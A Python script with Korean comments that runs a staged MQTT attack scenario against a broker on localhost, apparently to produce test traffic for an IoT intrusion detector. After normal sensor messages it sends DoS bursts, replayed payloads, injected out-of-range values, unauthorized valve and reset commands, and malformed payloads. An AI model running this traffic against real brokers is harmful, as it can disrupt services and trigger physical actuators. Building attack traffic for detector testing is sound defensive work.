#!/usr/bin/env python3
# File: test_all_attacks_prod.py
# 실무형 복합 공격 시나리오: 정상 → DoS → Replay → DataInjection → Unauthorized → Malformed
import time
import random
import json
import argparse
from paho.mqtt.client import Client

BROKER = "localhost"
PORT   = 1883

def main():
    parser = argparse.ArgumentParser(description="실무형 복합 공격 시나리오")
    parser.add_argument("--duration", type=int, default=120, help="전체 시나리오 지속 시간(초)")
    args = parser.parse_args()

    client = Client(client_id="attacker_prod", clean_session=False)
    client.connect(BROKER, PORT, keepalive=30)
    client.loop_start()
    time.sleep(1)

    # 1) [0~20초] 정상 트래픽 (PUBLISH QoS=1, 1초 5~10회)
    end_time = time.time() + 20
    while time.time() < end_time:
        payload = {"temperature": round(random.uniform(10,30),2), "humidity": round(random.uniform(30,70),2)}
        client.publish("sensor/data", payload=json.dumps(payload), qos=1)
        time.sleep(random.uniform(0.1, 0.2))
    print("[단계1] 정상 트래픽 완료")

    # 2) [20~40초] DoS 트래픽 (QoS=1, 1초에 100회 버스트)
    end_time = time.time() + 20
    while time.time() < end_time:
        for i in range(100):
            client.publish("test/topic", payload=f"dos_{i}", qos=1)
        time.sleep(1)
    print("[단계2] DoS 트래픽 완료")

    # 3) [40~55초] Replay 공격: JSON 페이로드 동일 20회
    replay_json = json.dumps({"temperature": 20, "humidity": 50})
    for i in range(20):
        client.publish("sensor/data", payload=replay_json, qos=1)
        time.sleep(0.05)
    print("[단계3] Replay 공격 완료")

    # 4) [55~70초] Data Injection: 온도/습도 범위 벗어난 값 3회
    bad_list = [
        {"temperature": 999, "humidity": 50},
        {"temperature": 25, "humidity": -10},
        {"temp": 20}  # 키 누락
    ]
    for payload in bad_list:
        client.publish("sensor/data", payload=json.dumps(payload), qos=1)
        time.sleep(0.5)
    print("[단계4] Data Injection 완료")

    # 5) [70~85초] Unauthorized Topic: actuator/control 3회
    for cmd in ["OPEN_VALVE", "CLOSE_VALVE", "RESET"]:
        client.publish("actuator/control", payload=cmd, qos=1)
        time.sleep(0.5)
    print("[단계5] Unauthorized Topic 완료")

    # 6) [85~95초] Malformed Size: 500바이트 페이로드 2회
    big = "X" * 500
    client.publish("sensor/data", payload=big, qos=1)
    time.sleep(1)
    client.publish("sensor/data", payload=big, qos=1)
    print("[단계6] Malformed Size 완료")

    # 7) [95~105초] Malformed JSON: 잘못된 JSON 2회
    bad_json = '{"temperature":20,, "humidity":50'
    client.publish("sensor/data", payload=bad_json, qos=1)
    time.sleep(1)
    client.publish("sensor/data", payload=bad_json, qos=1)
    print("[단계7] Malformed JSON 완료")

    client.loop_stop()
    client.disconnect()
    print("[종료] 모든 공격 시나리오 완료")

if __name__ == "__main__":
    main()
